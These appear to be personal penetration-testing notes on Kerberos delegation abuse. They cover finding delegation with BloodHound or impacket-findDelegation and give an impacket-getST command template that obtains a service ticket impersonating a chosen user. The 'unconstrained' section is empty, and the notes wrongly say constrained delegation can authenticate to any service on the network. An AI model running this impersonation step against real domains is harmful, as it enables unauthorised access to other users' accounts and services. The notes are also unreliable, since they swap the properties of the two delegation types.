## delegation
delegation in kerberos is how a user can perform actions on behalf of another user.
extension to kerberos.
can be found with bloodhound or with `impacket-findDelegation`.

### unconstrained

### constrained
can authenticate to any service on the network.
use `impacket-getST` to get service ticket.
get SPN from the last column of `impacket-findDelegation` "DelegationRightsTo".
```bash
impacket-getST -spn SERVICE/HOSTNAME_YOU_HAVE_DELEGATION_RIGHTS_TO.FQDN -impersonate TARGET_USER DOMAIN/USERNAME:PASSWORD
```
